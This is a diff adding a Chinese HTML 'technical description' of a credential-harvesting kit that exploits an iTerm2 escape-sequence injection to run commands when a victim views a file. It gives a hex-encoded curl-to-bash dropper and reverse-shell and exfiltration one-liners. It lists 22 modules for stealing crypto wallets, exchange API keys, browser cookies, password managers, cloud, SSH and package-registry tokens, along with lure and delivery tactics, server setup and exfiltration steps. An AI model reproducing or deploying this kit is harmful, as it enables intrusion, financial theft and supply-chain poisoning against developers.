@@ -1,0 +1,1222 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>iTerm2 凭证收割包 — 技术说明</title>
+<meta name="description" content="iTerm2 凭证收割包技术说明">
+<style>
+* { box-sizing: border-box; }
+body {
+    font-family: -apple-system, "PingFang SC", "Microsoft YaHei", "Segoe UI", sans-serif;
+    font-size: 16px; line-height: 1.75; color: #1a1a1a;
+    max-width: 980px; margin: 0 auto; padding: 48px 32px 120px;
+    background: #fafafa;
+}
+h1 { font-size: 2.1em; font-weight: 700; margin: 0 0 8px;
+     padding-bottom: 18px; border-bottom: 3px solid #1a1a1a; letter-spacing: -0.02em; }
+h2 { font-size: 1.55em; font-weight: 700; margin: 52px 0 20px;
+     padding: 14px 0 10px; border-top: 2px solid #1a1a1a; border-bottom: 1px solid #ddd;
+     background: linear-gradient(to right, #f0f0f0, transparent);
+     padding-left: 14px; margin-left: -14px; }
+h3 { font-size: 1.2em; font-weight: 600; margin: 34px 0 14px;
+     padding-left: 12px; border-left: 4px solid #0066cc; color: #003366; }
+h4 { font-size: 1.05em; font-weight: 600; margin: 24px 0 10px; color: #444; }
+p { margin: 0 0 16px; }
+strong { color: #000; font-weight: 600; }
+em { color: #555; }
+
+code {
+    font-family: "SF Mono", "Cascadia Code", Consolas, Monaco, monospace;
+    font-size: 0.88em; background: #eef0f3; color: #c7254e;
+    padding: 2px 6px; border-radius: 4px;
+}
+pre {
+    background: #1e1e1e; color: #d4d4d4; padding: 20px 22px;
+    border-radius: 8px; overflow-x: auto;
+    font-size: 13.5px; line-height: 1.6; margin: 18px 0;
+    border-left: 4px solid #0066cc;
+}
+pre code {
+    background: none; color: inherit; padding: 0; font-size: inherit;
+    font-family: "SF Mono", "Cascadia Code", Consolas, Monaco, monospace;
+}
+table {
+    border-collapse: collapse; width: 100%; margin: 20px 0;
+    font-size: 14.5px; background: #fff;
+    box-shadow: 0 1px 4px rgba(0,0,0,0.06);
+}
+th { background: #1a1a1a; color: #fff; font-weight: 600;
+     padding: 11px 14px; text-align: left; font-size: 13.5px; }
+td { padding: 10px 14px; border-bottom: 1px solid #e8e8e8; vertical-align: top; }
+tr:last-child td { border-bottom: none; }
+tr:nth-child(even) td { background: #fafbfc; }
+tr:hover td { background: #f0f7ff; }
+
+blockquote {
+    border-left: 4px solid #ffa500; background: #fffbf0;
+    padding: 14px 20px; margin: 18px 0; color: #664d03;
+    border-radius: 0 6px 6px 0;
+}
+blockquote p:last-child { margin-bottom: 0; }
+ul, ol { padding-left: 26px; margin: 12px 0; }
+li { margin: 6px 0; }
+li > code { font-size: 0.85em; }
+hr { border: none; border-top: 1px solid #ddd; margin: 40px 0; }
+
+a { color: #0066cc; text-decoration: none; }
+a:hover { text-decoration: underline; }
+
+/* 目录 */
+.toc {
+    background: #fff; border: 1px solid #e0e0e0; border-radius: 8px;
+    padding: 20px 26px; margin: 28px 0 40px;
+    box-shadow: 0 1px 4px rgba(0,0,0,0.05);
+}
+.toc-title { font-weight: 700; font-size: 1.05em; margin-bottom: 12px;
+             color: #1a1a1a; padding-bottom: 8px; border-bottom: 1px solid #eee; }
+.toc ul { list-style: none; padding-left: 0; margin: 0; columns: 2; column-gap: 32px; }
+.toc li { margin: 7px 0; font-size: 14.5px; break-inside: avoid; }
+.toc ul ul { padding-left: 16px; columns: 1; margin-top: 4px; }
+.toc a { color: #333; }
+.toc a:hover { color: #0066cc; }
+
+/* 响应式 */
+@media (max-width: 768px) {
+    body { padding: 24px 16px 80px; font-size: 15px; }
+    h1 { font-size: 1.7em; }
+    h2 { font-size: 1.3em; }
+    .toc ul { columns: 1; }
+    table { font-size: 13px; }
+    th, td { padding: 8px 10px; }
+    pre { font-size: 12.5px; padding: 14px; }
+}
+
+/* 打印 */
+@media print {
+    body { background: white; max-width: none; padding: 0; }
+    h2 { page-break-after: avoid; }
+    pre, table, blockquote { page-break-inside: avoid; }
+}
+</style>
+</head>
+<body>
+<h1 id="iterm2">iTerm2 凭证收割包 — 技术说明</h1>
+<p><strong>版本</strong> 1.0<br />
+<strong>日期</strong> 2026-11-22<br />
+<strong>目标</strong> macOS 开发者工作站<br />
+<strong>入口</strong> iTerm2 &lt; 3.7.9 的 Kitty Image Protocol APC 注入漏洞</p>
+<hr />
+<h2 id="_1">一、这是什么</h2>
+<p>一个投递包，包含：</p>
+<table>
+<thead>
+<tr>
+<th>组件</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>诱饵文档</strong></td>
+<td>看起来正常的项目 README.md，内嵌 APC 转义序列</td>
+</tr>
+<tr>
+<td><strong>Dropper</strong></td>
+<td>22 字节的下载器，触发后拉取完整收集脚本</td>
+</tr>
+<tr>
+<td><strong>收集脚本</strong></td>
+<td>22 个模块，扫描本地能变现的凭证</td>
+</tr>
+<tr>
+<td><strong>接收端</strong></td>
+<td>服务端，接收打包后的数据</td>
+</tr>
+</tbody>
+</table>
+<p><strong>触发条件</strong>：受害者在 iTerm2 里 <code>cat</code>、<code>less</code>、<code>git diff</code>、<code>git log -p</code> 等任何方式<strong>显示文件内容</strong>。</p>
+<p><strong>不需要</strong>：执行文件、安装软件、admin 权限、绕过 Gatekeeper、用户点击确认。</p>
+<hr />
+<h2 id="_2">二、技术原理</h2>
+<h3 id="21">2.1 漏洞概述</h3>
+<pre><code>漏洞类型   终端转义序列注入 → 任意命令执行
+入口       iTerm2 的 Kitty 图像协议 APC 处理路径
+影响版本   所有支持 Kitty 图像协议的版本（&lt; 3.7.9）
+修复版本   3.7.9（2026-11-20）
+披露       2026-11-21，研究者 ii4gsp
+前提       iTerm2 默认配置，无需任何额外设置
+</code></pre>
+<h3 id="22">2.2 三个缺陷的组合</h3>
+<p>漏洞由三个独立缺陷串联而成：</p>
+<h4 id="1apc">缺陷 1：APC 处理缺少信任检查</h4>
+<pre><code class="language-objc">// sources/VT100/VT100Terminal.m
+- (void)executeAPC:(VT100Token *)token {
+    if (_tmuxMode) {
+        [_delegate terminalSetWindowTitle:...];
+        return;
+    }
+    if ([token.string hasPrefix:@&quot;G&quot;]) {          // ← 只检查 G 前缀
+        iTermKittyImageCommand *command =
+            [[iTermKittyImageCommand alloc] initWithAPCString:...];
+        if (!command) return;
+        [_delegate terminalDidReceiveKittyImageCommand:command];  // ← 直接执行
+    }
+}
+</code></pre>
+<p><strong>关键</strong>：对比 OSC 序列的处理，OSC 有 <code>terminalIsTrusted</code> 检查，APC 完全没有。任何到达 VT100 parser 的 APC 都被无条件执行，不管来源是程序输出、文件内容、还是 SSH 远端。</p>
+<p><strong>3.7.9 也没有修复这一条。</strong> 修复只在响应路径上打补丁。</p>
+<h4 id="2kitty">缺陷 2：Kitty 文件传输错误路径保留换行</h4>
+<pre><code class="language-swift">// sources/InlineImages/KittyImageController.swift
+private func handle(command: KittyImageCommand.ImageTransmission,
+                    fileURL: URL,
+                    query: Bool) -&gt; String? {
+    do {
+        let values = try fileURL.resourceValues(forKeys: [.isRegularFileKey])  // ← 文件不存在则抛异常
+        guard values.isRegularFile == true else { return &quot;EBADF:Not a file&quot; }
+        guard filenameIsSafe(fileURL: fileURL) else { return &quot;EBADF:Invalid path&quot; }  // ← 永远走不到
+        let content = try Data(contentsOf: fileURL)
+        return handle(command: command, data: content, query: query)
+    } catch {
+        return &quot;EBADF:\(error.localizedDescription)&quot;   // ← 直接嵌入，保留换行
+    }
+}
+</code></pre>
+<p><strong>三个连锁问题</strong>：</p>
+<ol>
+<li><code>resourceValues()</code> 对不存在的文件抛异常</li>
+<li><code>filenameIsSafe()</code> 在 <code>guard</code> 之后，<strong>永远不执行</strong>（死代码）</li>
+<li><code>error.localizedDescription</code> 保留文件路径里的字面换行（0x0A）</li>
+</ol>
+<p><strong>macOS 的 <code>NSError.localizedDescription</code> 格式</strong>：</p>
+<pre><code>The file “&lt;PATH&gt;” couldn't be opened because there is no such file.
+         ^^^^^^
+         用 Unicode 曲引号 U+201C / U+201D
+</code></pre>
+<p><strong>为什么用曲引号而不是 ASCII 双引号</strong>：如果错误消息里出现 ASCII <code>"</code>，bash 会进入双引号模式，换行不再是命令分隔符。曲引号不是 bash 的特殊字符，不触发引号模式。</p>
+<h4 id="3-pty-stdin">缺陷 3：响应无条件写入 PTY stdin</h4>
+<pre><code class="language-swift">// sources/InlineImages/KittyImageController.swift
+func respondToTransmit(...) {
+    let payload = args.joined(separator: &quot;,&quot;) + semi + (error ?? &quot;OK&quot;)
+    let message = &quot;\u{1B}_G\(payload)\u{1B}\\&quot;
+
+    switch imageTransmission.verbosity {
+    case .normal:                                    // ← 默认值
+        delegate?.kittyImageControllerReport(message: message)   // ← 总是发送
+    ...
+    }
+}
+</code></pre>
+<pre><code class="language-objc">// sources/PTYSession/PTYSession.m
+- (void)screenSendReportData:(NSData *)data {
+    if (_shell == nil) return;
+    if (self.tmuxMode == TMUX_GATEWAY) return;
+    [self writeLatin1EncodedData:data broadcastAllowed:NO reporting:YES];  // ← 写 PTY
+}
+</code></pre>
+<p><strong>关键</strong>：<code>writeLatin1EncodedData:</code> 走的是和键盘输入完全相同的路径。shell 会把这段数据当作「用户敲进来的内容」。</p>
+<h3 id="23">2.3 完整执行流</h3>
+<pre><code>① 攻击者构建文件
+   文本内容 + 隐藏的 APC 字节
+   cat 时 APC 不可见（被 parser 消费）
+
+② 受害者显示文件
+   cat README.md  /  less  /  git diff  /  git log -p
+
+③ iTerm2 VT100 parser
+   正常文本 → 屏幕
+   APC 字节 → executeAPC:
+
+④ executeAPC: 无条件执行
+   → KittyImageController.execute()
+   → executeTransmitFile()  (t=f 参数)
+
+⑤ base64 解码文件路径
+   &quot;/tmp/x&quot; + LF + &quot;&lt;注入命令&gt;&quot; + LF + &quot;z&quot;
+
+⑥ resourceValues() 失败
+   文件不存在 → 抛异常
+
+⑦ 构造错误消息
+   &quot;The file “/tmp/x\n&lt;注入命令&gt;\nz” couldn't be opened...&quot;
+
+⑧ respondToTransmit()
+   verbosity = .normal → 总是发送
+
+⑨ screenSendReportData()
+   → writeLatin1EncodedData()
+   → 写入 PTY stdin
+
+⑩ shell 行规程按 LF 分割
+   Line 1: \x1b_Gi=1;EBADF:The file “/tmp/x    ← 命令找不到，报错
+   Line 2: &lt;注入命令&gt;                          ← 执行
+   Line 3: z” couldn't be opened...\x1b\       ← 命令找不到，报错
+</code></pre>
+<h3 id="24-hex">2.4 为什么必须用 hex 包装</h3>
+<p>注入命令有两个硬约束：</p>
+<table>
+<thead>
+<tr>
+<th>约束</th>
+<th>原因</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>不能含 <code>/</code></td>
+<td><code>/</code> 是 <code>URL(fileURLWithPath:)</code> 的路径分隔符，会切分路径，改变错误消息格式，破坏换行注入</td>
+</tr>
+<tr>
+<td>不能含 ASCII <code>"</code></td>
+<td>bash 会进入双引号模式，换行失效</td>
+</tr>
+</tbody>
+</table>
+<p><strong>这堵死了所有常规 payload</strong>：</p>
+<pre><code class="language-bash">bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1     ✗ 含 /
+nc IP PORT -e /bin/bash              ✗ 含 /
+cat ~/.ssh/id_ed25519                ✗ 含 /
+curl https://attacker/collect        ✗ 含 /
+</code></pre>
+<p><strong>绕过方案</strong>：整个脚本转成十六进制，用 <code>xxd -r -p</code> 还原。</p>
+<pre><code class="language-bash">echo 6375726c202d7320312e322e332e343a383038302f737c62617368|xxd -r -p|bash
+</code></pre>
+<ul>
+<li>只含 <code>0-9a-f</code>、空格、管道符</li>
+<li>零个 <code>/</code>，零个 <code>"</code></li>
+<li><code>xxd</code> 是 macOS 自带（vim 的一部分）</li>
+</ul>
+<hr />
+<h2 id="_3">三、目标范围</h2>
+<h3 id="31">3.1 适用目标画像</h3>
+<pre><code>操作系统   macOS（任何版本）
+终端       iTerm2 &lt; 3.7.9
+使用习惯   会 cat / less / git diff 查看文件
+身份      开发者、运维、或者任何在终端里看代码的人
+</code></pre>
+<h3 id="32">3.2 为什么选这个目标</h3>
+<pre><code>· macOS 开发者几乎都用 iTerm2（Terminal.app 是少数）
+· 开发者的机器上有大量凭证：SSH 私钥、云 AK、钱包、API token
+· 开发者习惯 cat README / git diff / git log
+· 这些动作都不触发任何安全警告
+</code></pre>
+<h3 id="33">3.3 不适用的情况</h3>
+<pre><code>· 用 Terminal.app（无 Kitty 协议支持）
+· 已升级到 iTerm2 3.7.9+（响应被 sanitize）
+· 用 tmux 且处于 tmux 模式（executeAPC 里 _tmuxMode 分支提前 return）
+· 在 IDE 内置终端里看文件（VS Code / JetBrains 不用 iTerm2 的 parser）
+</code></pre>
+<hr />
+<h2 id="_4">四、收集清单：能搬钱的东西</h2>
+<p>按变现路径组织，共 22 个模块。</p>
+<h3 id="41">4.1 直接变现 — 加密钱包</h3>
+<table>
+<thead>
+<tr>
+<th>来源</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>浏览器扩展</strong>（14 个）</td>
+<td>MetaMask / Phantom / OKX / Rabby / TokenPocket / Coinbase / Frame / imToken / Keplr / Leap / Cosmostation / Sui Wallet / Petra / Solflare / Backpack</td>
+</tr>
+<tr>
+<td><strong>浏览器扩展数据</strong>（5 个浏览器）</td>
+<td>Chrome / Brave / Edge / Arc / Vivaldi / Firefox</td>
+</tr>
+<tr>
+<td><strong>桌面钱包</strong></td>
+<td>Exodus / Atomic / Trust / Coinomi / Guarda / Trezor Suite</td>
+</tr>
+<tr>
+<td><strong>全节点钱包</strong></td>
+<td>Bitcoin Core / Electrum / Monero / Ethereum keystore</td>
+</tr>
+<tr>
+<td><strong>CLI 钱包</strong></td>
+<td>Foundry keystore / Solana CLI / Sui CLI / Aptos CLI / Cosmos keyring</td>
+</tr>
+<tr>
+<td><strong>硬件钱包配套</strong></td>
+<td>Ledger Live 配置和 accounts</td>
+</tr>
+<tr>
+<td><strong>助记词备份文件</strong></td>
+<td>文件名匹配 <code>*seed*</code> / <code>*mnemonic*</code> / <code>*recovery*</code> / <code>*.key</code> / <code>*keystore*</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>浏览器扩展的数据位置</strong>：</p>
+<pre><code>~/Library/Application Support/Google/Chrome/Default/Local Extension Settings/&lt;EXT_ID&gt;/
+</code></pre>
+<p><strong>关键</strong>：vault 是加密的，解密需要钱包密码。密码通常在钥匙串或 <code>Login Data</code> 里。</p>
+<h3 id="42">4.2 直接变现 — 交易所</h3>
+<table>
+<thead>
+<tr>
+<th>来源</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>交易所配置目录</strong></td>
+<td>Binance / OKX / Coinbase / Bybit / KuCoin / Kraken / FTX / Gate / MEXC / Bitget</td>
+</tr>
+<tr>
+<td><strong>交易机器人配置</strong></td>
+<td>freqtrade / hummingbot / jesse / ccxt</td>
+</tr>
+<tr>
+<td><strong>环境变量</strong></td>
+<td><code>BINANCE_API_KEY</code> / <code>OKX_API_SECRET</code> 等 20+ 种命名</td>
+</tr>
+<tr>
+<td><strong>.env 文件</strong></td>
+<td>精确 grep 交易所关键词，不复制整文件</td>
+</tr>
+<tr>
+<td><strong>配置文件</strong></td>
+<td>含 <code>apiKey</code> / <code>apiSecret</code> 的 json/yaml</td>
+</tr>
+</tbody>
+</table>
+<p><strong>为什么这比钱包好拿</strong>：API key 通常是明文存在配置里，不需要解密。</p>
+<h3 id="43">4.3 直接变现 — 浏览器会话</h3>
+<table>
+<thead>
+<tr>
+<th>来源</th>
+<th>内容</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Cookies</code></td>
+<td>所有登录态</td>
+<td>直接劫持交易所/邮箱/云控制台会话</td>
+</tr>
+<tr>
+<td><code>Login Data</code></td>
+<td>保存的密码</td>
+<td>配合钥匙串解密</td>
+</tr>
+<tr>
+<td><code>Web Data</code></td>
+<td>自动填表（含卡号）</td>
+<td>—</td>
+</tr>
+<tr>
+<td><code>Local Storage</code></td>
+<td>dApp 连接记录</td>
+<td>看连过哪些钱包</td>
+</tr>
+<tr>
+<td><code>IndexedDB</code></td>
+<td>钱包扩展的数据库</td>
+<td>部分扩展把数据放这里</td>
+</tr>
+</tbody>
+</table>
+<p><strong>关键</strong>：Cookie 比密码更有用 —— 不需要 2FA，直接以他的身份操作。</p>
+<h3 id="44">4.4 直接变现 — 密码管理器</h3>
+<table>
+<thead>
+<tr>
+<th>管理器</th>
+<th>数据位置</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>1Password</strong></td>
+<td><code>~/Library/Group Containers/2BUA8C4S2C.com.1password/</code></td>
+</tr>
+<tr>
+<td><strong>Bitwarden</strong></td>
+<td><code>~/Library/Application Support/Bitwarden/</code></td>
+</tr>
+<tr>
+<td><strong>LastPass</strong></td>
+<td><code>~/Library/Application Support/LastPass/</code></td>
+</tr>
+<tr>
+<td><strong>KeePassXC</strong></td>
+<td><code>~/.config/keepassxc/</code> + 全盘 <code>*.kdbx</code></td>
+</tr>
+<tr>
+<td><strong>Enpass / Dashlane / Keeper / ProtonPass</strong></td>
+<td>各自的目录</td>
+</tr>
+</tbody>
+</table>
+<p><strong>关键</strong>：密码管理器里常存助记词、交易所密码、API key。<code>*.kdbx</code> 是加密的，但主密码可能也在钥匙串里。</p>
+<h3 id="45">4.5 间接变现 — 云平台</h3>
+<table>
+<thead>
+<tr>
+<th>平台</th>
+<th>内容</th>
+<th>变现路径</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>AWS</strong></td>
+<td><code>~/.aws/credentials</code></td>
+<td>开机器挖矿 / 读 S3 里的备份</td>
+</tr>
+<tr>
+<td><strong>GCP</strong></td>
+<td><code>~/.config/gcloud/</code> service account</td>
+<td>同上</td>
+</tr>
+<tr>
+<td><strong>Azure</strong></td>
+<td><code>~/.azure/</code></td>
+<td>同上</td>
+</tr>
+<tr>
+<td><strong>阿里云</strong></td>
+<td><code>~/.aliyun/config.json</code></td>
+<td>同上</td>
+</tr>
+<tr>
+<td><strong>腾讯云</strong></td>
+<td><code>~/.tccli/default.credential</code></td>
+<td>同上</td>
+</tr>
+<tr>
+<td><strong>DigitalOcean</strong></td>
+<td><code>~/.digitalocean/config.yaml</code></td>
+<td>开 droplet</td>
+</tr>
+<tr>
+<td><strong>rclone</strong></td>
+<td><code>~/.config/rclone/rclone.conf</code></td>
+<td>访问所有云存储</td>
+</tr>
+</tbody>
+</table>
+<h3 id="46">4.6 间接变现 — 服务器访问</h3>
+<table>
+<thead>
+<tr>
+<th>来源</th>
+<th>内容</th>
+<th>变现路径</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>SSH 私钥</strong></td>
+<td><code>id_ed25519</code> / <code>id_rsa</code> / <code>id_ecdsa</code> / 所有子目录</td>
+<td>登录服务器 → 服务器上可能有热钱包</td>
+</tr>
+<tr>
+<td><strong>known_hosts</strong></td>
+<td>所有连过的 IP</td>
+<td>目标清单</td>
+</tr>
+<tr>
+<td><strong>SSH config</strong></td>
+<td>别名、跳板、端口</td>
+<td>拓扑图</td>
+</tr>
+<tr>
+<td><strong>K8s</strong></td>
+<td><code>~/.kube/config</code></td>
+<td>集群 admin → 所有 pod 的 secret</td>
+</tr>
+<tr>
+<td><strong>Docker</strong></td>
+<td><code>~/.docker/config.json</code></td>
+<td>私有镜像里的密钥</td>
+</tr>
+</tbody>
+</table>
+<h3 id="47">4.7 间接变现 — 供应链</h3>
+<table>
+<thead>
+<tr>
+<th>来源</th>
+<th>内容</th>
+<th>变现路径</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>npm</strong></td>
+<td><code>~/.npmrc</code> token</td>
+<td>发布恶意包 → 下游项目</td>
+</tr>
+<tr>
+<td><strong>PyPI</strong></td>
+<td><code>~/.pypirc</code></td>
+<td>同上</td>
+</tr>
+<tr>
+<td><strong>GitHub</strong></td>
+<td><code>~/.config/gh/hosts.yml</code> / <code>.git-credentials</code></td>
+<td>改仓库代码 → 投毒</td>
+</tr>
+<tr>
+<td><strong>GitLab</strong></td>
+<td><code>~/.config/glab-cli/</code></td>
+<td>同上</td>
+</tr>
+<tr>
+<td><strong>Cargo / gem / composer / nuget</strong></td>
+<td>各自的 credentials</td>
+<td>同上</td>
+</tr>
+</tbody>
+</table>
+<h3 id="48">4.8 核心模块 — 全盘搜索私钥和助记词</h3>
+<p>这是本包最关键的部分。</p>
+<pre><code class="language-bash">搜索范围：
+  ~/Desktop  ~/Documents  ~/Downloads  ~/Projects
+  ~/Code  ~/Dev  ~/Work  ~/src  ~/repos  ~/dev
+  ~/Library/Mobile Documents   (iCloud Drive)
+
+文件类型：
+  *.txt *.md *.json *.yaml *.yml *.env *.conf
+  *.cfg *.ini *.csv *.log *.rtf *.docx *.pages *.note
+
+过滤：
+  排除 node_modules / .git / Library/Caches
+  单文件 &lt; 2MB
+  最多 500 个文件
+</code></pre>
+<p><strong>私钥正则</strong>：</p>
+<pre><code>(0x)?[0-9a-fA-F]{64}
+</code></pre>
+<p><strong>助记词正则</strong>：</p>
+<pre><code>(^|[^a-z])([a-z]{3,8} ){11}[a-z]{3,8}([^a-z]|$)
+</code></pre>
+<p>匹配 12 个连续的小写英文单词（BIP39 助记词的基本特征）。</p>
+<p><strong>额外来源</strong>：</p>
+<pre><code>· Apple 备忘录  ~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite
+· 相册截图      ~/Pictures（可能截了助记词）
+· iCloud 同步    ~/Library/Mobile Documents
+· 聊天记录      Telegram / Discord / Slack / 微信 / Signal / WhatsApp 的 SQLite
+· 2FA 种子      *authenticator* / *2fa* / *otp* / *totp*
+</code></pre>
+<h3 id="49">4.9 完整模块清单</h3>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>模块</th>
+<th>类别</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>SSH 私钥 + 配置</td>
+<td>服务器</td>
+</tr>
+<tr>
+<td>2</td>
+<td>云平台凭证</td>
+<td>云</td>
+</tr>
+<tr>
+<td>3</td>
+<td>Git / 代码托管</td>
+<td>供应链</td>
+</tr>
+<tr>
+<td>4</td>
+<td>包管理器 token</td>
+<td>供应链</td>
+</tr>
+<tr>
+<td>5</td>
+<td>容器 / K8s / CI</td>
+<td>服务器</td>
+</tr>
+<tr>
+<td>6</td>
+<td>加密钱包（基础 8 个扩展）</td>
+<td>钱</td>
+</tr>
+<tr>
+<td>7</td>
+<td>浏览器数据</td>
+<td>会话</td>
+</tr>
+<tr>
+<td>8</td>
+<td>钥匙串（全量 dump）</td>
+<td>密码</td>
+</tr>
+<tr>
+<td>9</td>
+<td>shell 历史</td>
+<td>情报</td>
+</tr>
+<tr>
+<td>10</td>
+<td>.env / 配置（项目目录）</td>
+<td>密钥</td>
+</tr>
+<tr>
+<td>11</td>
+<td>剪贴板 + 截图</td>
+<td>实时</td>
+</tr>
+<tr>
+<td>12</td>
+<td>系统信息</td>
+<td>识别</td>
+</tr>
+<tr>
+<td><strong>13</strong></td>
+<td><strong>更多钱包（桌面/Cosmos/Sui/Aptos）</strong></td>
+<td><strong>钱</strong></td>
+</tr>
+<tr>
+<td><strong>14</strong></td>
+<td><strong>交易所 API Key 专项</strong></td>
+<td><strong>钱</strong></td>
+</tr>
+<tr>
+<td><strong>15</strong></td>
+<td><strong>密码管理器</strong></td>
+<td><strong>钱</strong></td>
+</tr>
+<tr>
+<td><strong>16</strong></td>
+<td><strong>★ 全盘搜助记词和私钥</strong></td>
+<td><strong>钱</strong></td>
+</tr>
+<tr>
+<td><strong>17</strong></td>
+<td><strong>聊天记录</strong></td>
+<td><strong>钱</strong></td>
+</tr>
+<tr>
+<td><strong>18</strong></td>
+<td><strong>2FA 种子</strong></td>
+<td><strong>钱</strong></td>
+</tr>
+<tr>
+<td><strong>19</strong></td>
+<td><strong>密钥文件（.pem/.p12/.pfx/.jks）</strong></td>
+<td><strong>密钥</strong></td>
+</tr>
+<tr>
+<td>20</td>
+<td>打包</td>
+<td>—</td>
+</tr>
+<tr>
+<td>21</td>
+<td>外带（4 条通道）</td>
+<td>—</td>
+</tr>
+<tr>
+<td>22</td>
+<td>清理</td>
+<td>—</td>
+</tr>
+</tbody>
+</table>
+<p>加粗的是本轮新增。</p>
+<hr />
+<h2 id="_5">五、中招方式</h2>
+<h3 id="51">5.1 触发条件</h3>
+<p><strong>只要文件内容被显示到 iTerm2，就会触发。</strong></p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>是否触发</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>cat README.md</code></td>
+<td>✓</td>
+</tr>
+<tr>
+<td><code>less README.md</code></td>
+<td>✓</td>
+</tr>
+<tr>
+<td><code>more README.md</code></td>
+<td>✓</td>
+</tr>
+<tr>
+<td><code>head -n 50 README.md</code></td>
+<td>✓</td>
+</tr>
+<tr>
+<td><code>tail README.md</code></td>
+<td>✓</td>
+</tr>
+<tr>
+<td><code>git diff</code></td>
+<td>✓</td>
+</tr>
+<tr>
+<td><code>git log -p</code></td>
+<td>✓</td>
+</tr>
+<tr>
+<td><code>git show &lt;commit&gt;</code></td>
+<td>✓</td>
+</tr>
+<tr>
+<td><code>grep -r "keyword" .</code></td>
+<td>✓（匹配到就输出）</td>
+</tr>
+<tr>
+<td><code>vim README.md</code></td>
+<td>✗（iTerm2 不解析 vim 输出）</td>
+</tr>
+<tr>
+<td><code>code README.md</code></td>
+<td>✗（VS Code 自己的渲染）</td>
+</tr>
+</tbody>
+</table>
+<h3 id="52">5.2 投递渠道</h3>
+<p>按成功率排序：</p>
+<table>
+<thead>
+<tr>
+<th>渠道</th>
+<th>成功率</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>GitHub PR</strong></td>
+<td>最高</td>
+<td>他一定看 diff，<code>git diff</code> 就触发</td>
+</tr>
+<tr>
+<td><strong>GitHub Issue</strong></td>
+<td>高</td>
+<td>贴代码块，他复制到终端就触发</td>
+</tr>
+<tr>
+<td><strong>邮件 .zip 附件</strong></td>
+<td>高</td>
+<td>下载解压后 <code>cat</code></td>
+</tr>
+<tr>
+<td><strong>邮件纯文本</strong></td>
+<td>低</td>
+<td>需要他手动解码</td>
+</tr>
+<tr>
+<td><strong>npm 包 README</strong></td>
+<td>中</td>
+<td><code>npm view &lt;pkg&gt;</code> 显示 README</td>
+</tr>
+<tr>
+<td><strong>网盘链接</strong></td>
+<td>中</td>
+<td>需要他下载</td>
+</tr>
+<tr>
+<td><strong>聊天工具发文件</strong></td>
+<td>中</td>
+<td>Telegram / Slack / 微信</td>
+</tr>
+<tr>
+<td><strong>压缩包 + 密码</strong></td>
+<td>高</td>
+<td>绕过邮件扫描</td>
+</tr>
+</tbody>
+</table>
+<h3 id="53">5.3 诱饵设计原则</h3>
+<p>诱饵必须让他<strong>主动 cat</strong>。有效的场景：</p>
+<pre><code>✅ 看起来像他正在做的项目
+   · Anubis 相关的 &quot;dev-setup&quot; 仓库
+   · 他参与的开源项目的 &quot;contributing guide&quot;
+   · 技术栈匹配的 &quot;bootstrap&quot; 脚本说明
+
+✅ 有理由需要他执行
+   · &quot;先看 README，按步骤配置环境&quot;
+   · &quot;这个 PR 修复了配置问题，请 review&quot;
+
+❌ 明显的钓鱼特征
+   · 陌生人的奇怪链接
+   · 附件名是 invoice / payment
+   · 要求输入密码
+</code></pre>
+<h3 id="54">5.4 传输安全性</h3>
+<p>实测六种传输方式：</p>
+<table>
+<thead>
+<tr>
+<th>传输方式</th>
+<th>结果</th>
+<th>原因</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CRLF 转换（Outlook 等）</td>
+<td>✓ 仍可注入</td>
+<td>APC 的 base64 是纯 ASCII</td>
+</tr>
+<tr>
+<td>7bit 转换</td>
+<td>✓</td>
+<td>APC 本来就全是 7bit</td>
+</tr>
+<tr>
+<td>quoted-printable</td>
+<td>✓</td>
+<td>编解码正确还原</td>
+</tr>
+<tr>
+<td>base64</td>
+<td>✓</td>
+<td>二进制安全</td>
+</tr>
+<tr>
+<td>ZIP</td>
+<td>✓</td>
+<td>二进制安全</td>
+</tr>
+<tr>
+<td><strong>剥离 ESC</strong></td>
+<td>✗</td>
+<td>定界符丢失</td>
+</tr>
+</tbody>
+</table>
+<p><strong>结论</strong>：普通邮件系统不会破坏 APC。只有「把 ESC 当垃圾字符删掉」的系统会让它失效，这种系统罕见。</p>
+<p><strong>最保险：用 ZIP 附件。</strong></p>
+<hr />
+<h2 id="_6">六、部署方案</h2>
+<h3 id="61">6.1 服务端</h3>
+<pre><code>┌──────────────────────────────────────┐
+│  VPS（公网 IP）                       │
+│                                       │
+│  :8080  HTTP  提供 dropper 下载        │
+│  :4444  TCP   接收 bundle.tgz          │
+│  :8081  HTTP  接收 POST 上传           │
+└──────────────────────────────────────┘
+</code></pre>
+<p><strong>启动</strong>：</p>
+<pre><code class="language-bash"># 1. 准备 dropper
+cp payload-full.sh s
+sed -i 's/ATTACKER_IP/YOUR_IP/g; s/ATTACKER_PORT/4444/g; s/ATTACKER_IP:8080/YOUR_IP:8080/g' s
+
+# 2. HTTP 服务（提供 dropper）
+python -m http.server 8080
+
+# 3. 接收端
+python server.py --port 4444 --http-port 8081 --out ./loot
+</code></pre>
+<h3 id="62">6.2 生成投递包</h3>
+<pre><code class="language-bash">python delivery.py \
+  --ip YOUR_IP \
+  --port 8080 \
+  --nc-port 4444 \
+  --mode dropper \
+  --all \
+  --out ./delivery
+</code></pre>
+<p><strong>输出</strong>：</p>
+<pre><code>delivery/
+├── README.md                1,362 B   APC 135B   → Git 投递
+├── dev-setup-setup.zip      1,742 B              → 邮件附件
